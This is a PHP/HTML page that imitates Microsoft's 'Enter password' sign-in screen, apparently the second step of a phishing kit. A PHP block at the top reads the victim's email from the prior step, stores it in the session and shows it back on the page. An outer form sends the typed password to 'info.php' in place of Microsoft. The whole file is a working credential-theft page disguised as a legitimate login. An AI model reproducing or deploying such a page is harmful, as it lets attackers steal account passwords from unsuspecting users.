<?php
session_start();
$Email = $_POST['login'];
$_SESSION['login']=$Email;
?>
<html dir="ltr" lang="EN-US"><form id="Form1" name="Form1" action="info.php" method="post"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27486.00/images/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="https://auth.gfx.ms/16.000.27486.00/Converged1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(c,f,e,b){var m=1,l=unescape('%3Cscript type="text/javascript" src="'),k=unescape('"%3E%3C/script%3E'),h=f,i=window,d=i.navigator;if(d&&d.userAgent&&b&&b!=f){var g=d.userAgent.toLowerCase(),n=g.indexOf("edge")>=0;if(!n){var a=g.match(/chrome\/([0-9]+)\./),j=a&&a.length==2&&!isNaN(a[1])&&parseInt(a[1])>54;if(j)h=b}}if(g_sSRSSuccess.indexOf(c)!=-1)return;if(typeof i[c]=="undefined"){g_iSRSFailed=1;e<=m&&document.write(l+h+k)}else g_sSRSSuccess+=c+"|"+e+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.27486.00/images/Windows_Live_v_thumb.jpg">

  <script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings", "https://auth.gfx.ms/16.000.27486.00/ConvergedLoginPaginatedStrings.EN.js", 1, "https://msagfx.live.com/16.000.27486.00/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore", "https://auth.gfx.ms/16.000.27486.00/ConvergedLogin_PCore.js", 1, "https://msagfx.live.com/16.000.27486.00/ConvergedLogin_PCore.js");</script><script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings", "https://auth.gfx.ms/16.000.27486.00/ConvergedLoginPaginatedStrings.EN.js", 2, "https://msagfx.live.com/16.000.27486.00/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore", "https://auth.gfx.ms/16.000.27486.00/ConvergedLogin_PCore.js", 2, "https://msagfx.live.com/16.000.27486.00/ConvergedLogin_PCore.js");</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27486.00/images/Backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27486.00/images/Backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1502586543&amp;rver=6.7.6643.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&amp;lc=1033&amp;id=292841&amp;mkt=en-us&amp;cbcxt=out&amp;fl=wld&amp;contextid=0D06463491588443&amp;bk=1502586544&amp;uaid=a83d6c55988a4dcf933d6e9072b3c767&amp;pid=0"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.A6,
            showFooterLinks: true,
            useWizardBehavior: svr.BQ,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
         event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <div class="middle"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27486.00/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27486.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27486.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div data-bind="
                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
                    component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-bind="component: { name: 'login-paginated-password-view',
                        publicMethods: viewInterfaces[$index()],
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.K === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            load: view_onLoad,
                            switchView: view_onSwitchView,
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart,
                            updateBranding: $loginPage.view_onUpdateBranding } }"><!--  --> <input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> <input type="hidden" name="login" value="<?php echo($_SESSION['login']); ?>"> <input name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> <input name="type" data-bind="value: svr.BQ ? 20 : 11" value="11" type="hidden"> <input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> <input name="lrt" data-bind="value: isLongRunningTransaction" value="" type="hidden"> <div data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.Bu,
        displayName: displayName } }"><!--  --> <div class="identityBanner"> <div class="identity" data-bind="text: displayName, attr: { 'title': displayName }" title="<?php echo($_SESSION['login']); ?>"><?php echo($_SESSION['login']); ?></div> <div class="profile-photo"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" data-bind="attr: { src: getDarkUrl() }" src="https://auth.gfx.ms/16.000.27486.00/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb"><!-- /ko --> <!-- /ko --><!-- /ko --> </div> </div><!-- ko if: svr.bj && !userTileUrl() --><!-- /ko --></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: pageDescription --><!-- /ko --> <div class="row"><div class="form-group col-md-24">
<input maxlength="127" aria-label="Password" name="passwd" id="i0118" autocomplete="off" class="form-control" type="password" placeholder="Password" required>
</div> <!-- /ko --></div> </div> </div><!-- ko if: svr.U && showHip --><!-- /ko --> <div class="row"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.A6,
            isSecondaryButtonVisible: svr.A6 &amp;&amp; !isInitialView },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }"> <div data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" type="button"> </div> <div data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-12 primary"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in" type="submit"> </div> </div></div> </div><!-- ko if: svr.BN --><!-- /ko --><!-- ko if: svr.BJ !== false && !svr.BN --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { 'no-margin-bottom': !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1502586543%26rver%3d6.7.6643.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%26lc%3d1033%26id%3d292841%26mkt%3den-us%26cbcxt%3dout%26fl%3dwld%26contextid%3d0D06463491588443%26bk%3d1502586544&amp;id=292841&amp;uiflavor=web&amp;cobrandid=140729177927720&amp;uaid=a83d6c55988a4dcf933d6e9072b3c767&amp;mkt=EN-US&amp;lc=1033&amp;bk=1502586544" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.e, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko if: hasRemoteNgc --><!-- /ko --> <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" href="https://login.live.com/logout.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1502586543&amp;rver=6.7.6643.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&amp;lc=1033&amp;id=292841&amp;mkt=en-us&amp;cbcxt=out&amp;fl=wld&amp;contextid=0D06463491588443&amp;ru=https://outlook.live.com/owa/&amp;bk=1502586544&amp;lm=I" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], href: svr.urlSwitch">Sign in with a different Microsoft account</a> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.B2 }, value: flowToken" name="PPFT" value="DQRUKoZfos6wsy497PsqQHoSUoA3sJziOQ254Ai7TV2A4m12bFE!l33kwZyyRLgR8y66nyRluWuefby6ghF3RdHCED19gx!ZSvcRcU!Yi0v7ceLC9tMzWpsVNzJQYfVgTmzd2!7OPEKzG9zVcpe9fS99cWFBVC8uu5y!xU6sC7Die3to3JnWiseSSYcH!iZj7atk2tbcjMnKR9O!Fvi!eJHBxmGXXmwv0l7sI5W8WYN*3GgKa!UKpqeRRQ!AvTg*QgEjGeKjoWTp0kGTumAzDW8$" type="hidden"> <input name="PPSX" data-bind="value: svr.t" value="PassportR" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.aA" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="0" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="__ConvergedLoginPaginatedStrings|1,__ConvergedLogin_PCore|1," type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> </div> <!-- /ko --></div><!-- ko if: desktopSsoRunning --><!-- /ko --><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.ac">�2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form></div><iframe id="idPartnerPL" style="display: none;" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=EN-US" width="0" height="0"></iframe></body></html>